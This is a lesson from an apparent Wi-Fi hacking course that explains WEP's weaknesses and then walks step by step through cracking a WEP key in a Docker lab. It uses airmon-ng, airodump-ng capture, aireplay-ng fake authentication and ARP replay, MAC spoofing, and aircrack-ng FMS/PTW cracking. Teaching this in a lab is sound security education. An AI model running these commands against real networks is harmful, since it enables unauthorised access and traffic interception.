# WEP Cracking Lab
## Introduction
The protocol par excellence that allows us to establish a wireless connection both to the Internet (the rest of the world) and to local-area devices (LAN networks) is the IEEE 802.11 protocol, better known as Wi-Fi. This protocol has evolved both in technical aspects that allow higher speed, bandwidth, and so on, and in terms of security. Focusing on the latter, the evolution of wireless network security can be summarized in four protocols: WEP, WPA/WPA2, WPS, and WPA3.

Throughout this course, these protocols will be studied, along with their vulnerabilities, which allow attackers to gain illegitimate access to the Wi-Fi networks they protect. In addition, some countermeasures and recommendations that may help mitigate these problems will be discussed (if they are still sustainable today), as well as the consequences that arise when an attacker enters our Wi-Fi network by taking advantage of poor configurations or by exploiting vulnerabilities that compromise the machines connected to that network.

## WEP Security Protocol
First, the very first security protocol designed to protect IEEE 802.11 networks will be analyzed: the WEP protocol. WEP was originally designed in 1997 as part of the IEEE 802.11 standard, making it the first security mechanism established by the standard more colloquially known as Wi-Fi. Its operation is focused on providing confidentiality, integrity, and access control in wireless communications. [[33](https://ieeexplore.ieee.org/document/654749)]

This security protocol is based on the use of the RC4 stream cipher (whose use would soon become discouraged due to various vulnerabilities) with pre-shared keys of 40 or 104 bits in length, to which a 24-bit initialization vector (IV) is concatenated in order to provide greater randomness to the final key [[33](https://ieeexplore.ieee.org/document/654749)]:
![image](https://github.com/user-attachments/assets/55ec2072-4bac-426f-8174-9b5c2b9a3ebd)

In addition, the use of the CRC mechanism for checking the integrity of exchanged messages can be seen, although this protocol was already vulnerable at the time because it is a linear operation that is easily predictable.

### Vulnerabilities
Today, this protocol has fallen completely out of use, since attacks quickly emerged that allowed malicious users to discover the pre-established key shared between the client and the access point. Among these attacks, the following stood out:

- **FMS (Fluhrer, Mantin, and Shamir):**  
  This attack focuses on exploiting the vulnerabilities of the RC4 protocol. To do so, it takes advantage of the limited size of IVs and the fact that they are shared in plain text. Specifically, it consists of collecting enough IVs (with greater success in networks where many users are connected to the same access point) until several messages with the same initialization vector are found. From there, it is enough to apply statistical methods to obtain the full key and decrypt the packets captured with that IV, or to obtain the pre-shared key that grants access to the network. [[34](https://matthieu.io/dl/papers/wifi-attacks-wep-wpa.pdf)]

- **Dictionary and statistical analysis attacks:**  
  This type of attack is very similar to the previous ones, although it improves efficiency thanks to the implementation of IV dictionaries associated with precomputed keys. In this way, not all possible options that may lead to a certain full key are tested, but only those related to the collected IVs according to precomputed RC4 keys. [[35](https://infoscience.epfl.ch/server/api/core/bitstreams/beffaf7b-9a49-40b5-a0bc-c41d76b253ca/content)]

- **Packet injection attacks:**  
  Rather than being an individual attack, this is more of a complement to the previous ones by introducing malicious packets with valid IVs into the network in order to increase the number of IVs that can be collected. [[35](https://infoscience.epfl.ch/server/api/core/bitstreams/beffaf7b-9a49-40b5-a0bc-c41d76b253ca/content)]

Next, the first of these will be shown, since it is the most common among attackers and is implemented by the `aircrack-ng` package.

## Attacking WEP
The first step in carrying out this attack is to start the lab; to do so, you must switch to this branch or download the files stored in it. Once all the necessary files are available, the lab is started by running the following command (it is recommended to do this on a machine with a full Linux kernel, due to functions not supported by Docker Desktop):
```bash
sudo ./launch.sh
```

`Note:` to stop the lab safely, run `sudo ./stop.sh`. This must also be done in order to restart it correctly before running `sudo ./launch.sh` again.

After waiting a few seconds for everything to be configured, the following messages will appear, consisting of unimportant warnings and lab information about the launch status:
![image](https://github.com/user-attachments/assets/98474acc-bad7-48c3-aa62-bacb38d541d4)

If everything has gone well, the attack can begin by connecting to the Kali machine:
```bash
docker-compose exec attacker-1 bash
```

Once inside the attacker machine, the wireless interface (normally `wlan4`, although it is advisable to check it with `ifconfig`) must be placed into monitor mode (which allows listening to packets not directed to our IP) in order to listen for *beacon* frames (access point announcements for clients to connect) and other packets of interest:
```bash
airmon-ng start wlan4
```

This brings the interface up in the new mode, so its name may now change to something like `wlan4mon` or remain the same (`wlan4`):
![image](https://github.com/user-attachments/assets/ceeabc84-91c1-43b6-bc51-06ab1b4adfc6)

Once in this mode, the `airodump-ng` command can be launched. It captures network packets within range of the specified monitor-mode interface. For an initial analysis, it is interesting to use it as follows:
```bash
airodump-ng wlan4mon
```

This captures absolutely everything, making it possible to detect the network to be attacked:
![image](https://github.com/user-attachments/assets/bb24637a-556b-44b7-a395-0e096132eaa6)

In this case there is only one network (`WEPnetwork`), but the most common situation is that this table shows entries for a larger number of networks, as happens, for example, in this image:
![image](https://github.com/user-attachments/assets/86c073a1-06bd-4f6e-b436-31f2e0cb6b95)

Once the target network has been located, it is possible to use this command together with the following options (you must adjust them to your own case) in order to capture the IVs required to carry out the FMS attack mentioned above.

```bash
airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w wep wlan4mon
```
* `-c 6`: channel on which the access point operates.  
* `--bssid 02:00:00:00:00:00`: MAC address of the access point.  
* `-w wep`: name (without extension) of the files where the captured packets will be stored.  
* `wlan4mon`: name of the attacker's interface.

In addition, by adding the `--ivs` option, the tool focuses on capturing IVs rather than the entire packet, which optimizes this step somewhat. However, even with this option, the necessary IVs are not easily obtained without waiting a long time. To speed up this process, a way must be found to significantly increase the number of IVs generated in the network. To achieve this, another command from the `aircrack-ng` package can be used: `aireplay-ng`.

In this way, ARP packets (*ARP requests*) can be injected, which the access point will retransmit, thereby generating more IVs. However, sending these packets is not so trivial, because the access point will only retransmit packets coming from an authenticated MAC address. Therefore, there are two options: know the MAC address of one of the clients and assign it to the attacker machine, or use `aireplay-ng` again to perform fake authentication against the access point, which allows association with it without being authorized. The second option will be addressed below, since it is not common to know the MAC addresses of authenticated clients:
```bash
docker-compose exec attacker-1 bash      # Run it in another terminal
aireplay-ng -1 0 -e WEPnetwork -a 02:00:00:00:00:00 -h 02:00:00:00:04:00 wlan4mon
```
* `-1`: *fake authentication*.  
* `0`: reassociation time in seconds.  
* `-e WEPnetwork`: SSID of the access point.  
* `-a 02:00:00:00:00:00`: MAC address of the access point.  
* `-h 02:00:00:00:04:00`: MAC address of the attacker's interface (`iw wlan4mon info`).  
* `wlan4mon`: name of the attacker's interface.

This command shows the following if a connection to the access point is successfully established:
![image](https://github.com/user-attachments/assets/bb2dfc3e-ce48-4bde-9f6c-81e17b53ecb7)

If it does not work, the MAC address can be obtained by accessing one of the clients' machines, or because `airodump-ng` captures its traffic:
![image](https://github.com/user-attachments/assets/c03451fa-5321-45a8-9926-ab789d25809d)

Then the attacker's MAC can be changed as follows:
```bash
macchanger -m 02:00:00:00:02:00 wlan4
```

This is one way to speed up the attack by avoiding fake authentication. It is recommended to try this method after completing the attack using fake authentication. Once authentication with the access point has been carried out (whether fake or achieved simply by changing the MAC), it becomes possible to send the ARP packets needed to increase the number of IVs:
```bash
aireplay-ng -3 -b 02:00:00:00:00:00 -h 02:00:00:00:04:00 wlan4mon
```
* `-3`: *ARP replay attack*.  
* `-b 02:00:00:00:00:00`: MAC address of the access point.  
* `-h 02:00:00:00:04:00`: MAC address of the attacker's interface.  
* `wlan4mon`: name of the attacker's interface.

In fact, this command takes the ARP packets it hears on any of the networks within range and retransmits them to the access point. Therefore, if you want to increase the number of ARP requests being sent, you can *ping* a machine accessible from the device (normally through a wired interface):
```bash
arping 10.5.2.129
```

However, since this is a simulated environment, this will most likely not work, producing output similar to this:
![image](https://github.com/user-attachments/assets/cb6c106f-b563-4b8f-995c-ac766f66805f)

This indicates that the ARP packets are not being retransmitted and, therefore, no new IVs are generated, which means this acceleration technique does not work and one must wait to collect more IVs. To avoid this and make the attack process more satisfying by avoiding long waits, it is possible to force ARP packets to be sent from any client with:
```bash
docker-compose exec client-1 bash      # Also possible with client-2 or client-3
while true; do
    arp-scan --interface=wlan1 --localnet
    sleep 5  # Wait 5 seconds between scans to avoid saturation
done
```

`Note:` this process is only possible in a simulation like this, since in a real environment there is no access to legitimate clients.

After waiting for `airodump-ng` to capture enough IVs, it must be stopped by pressing `q`, which generates several files storing the captured information in different formats. The most interesting of these is `*.cap`, which stores full packets, making it possible to analyze them with other tools such as Wireshark. In addition, this file can be used with `aircrack-ng` in order to carry out the FMS attack using the captured IVs:
```bash
aircrack-ng -b 02:00:00:00:00:00 wep*.cap
```
* `-b 02:00:00:00:00:00`: MAC of the access point (optional).  
* `wep*.cap`: use all `.cap` files beginning with the name `wep` (if several `airodump-ng` captures are made with `-w wep`, files named `wepN.extension` will be generated).  
![image](https://github.com/user-attachments/assets/a0b1b032-29c5-47bb-9195-9fa04af96d25)

Specifically, a version quite faithful to the original FMS algorithm is being executed, applying statistical methods through brute force. However, `aircrack-ng` offers another way to perform this attack, which it calls PTW. This method is an optimization of FMS that requires fewer IVs (it is faster), but full ARP packets must be captured (IVs could be generated with other protocols, but only ARP is seen for this reason), so the entire procedure would need to be repeated without the `--ivs` option if it was previously selected in `airodump-ng`.
```bash
aircrack-ng -z -b 02:00:00:00:00:00 wep*.cap
```
* `-z`: PTW WEP cracking.  
* `-b 02:00:00:00:00:00`: MAC of the access point (optional).  
* `wep*.cap`: use all `.cap` files beginning with the name `wep` (if several `airodump-ng` captures are made with `-w wep`, files named `wepN.extension` will be generated).  
![image](https://github.com/user-attachments/assets/0150abf2-6e10-4fb4-ac75-fcad7ddac014)

As can be seen, in both cases the key authorizing access to the network and enabling packet decryption is obtained, but if enough IVs have not been collected, something like this is shown:
![image](https://github.com/user-attachments/assets/d515b440-a399-4ca2-a5d6-a410e159ff8e)

`Note:` the key can be tested with `wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B`, which uses the `wpa_supplicant.conf` configuration file to define the key along with the SSID and everything necessary to establish the connection, together with `dhclient wlan4` to obtain an IP address. For this, it is advisable to use the `wlan4` interface outside monitor mode.

### Countermeasures and Recommendations
As already mentioned, this security protocol is now completely discouraged because of its multiple threats. Even new Wi-Fi access points no longer usually include it, so as not to expose users who might choose to use it either knowingly or out of ignorance. Therefore, there is no need to propose any countermeasure, since the best thing that can be done is simply to avoid its use.

[`Back to the introduction`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/main)  
[`Next lesson, attacks after gaining access`](https://github.com/carlosdomim02/Wi-Fi-Hacking-Course-English/tree/Attacks)
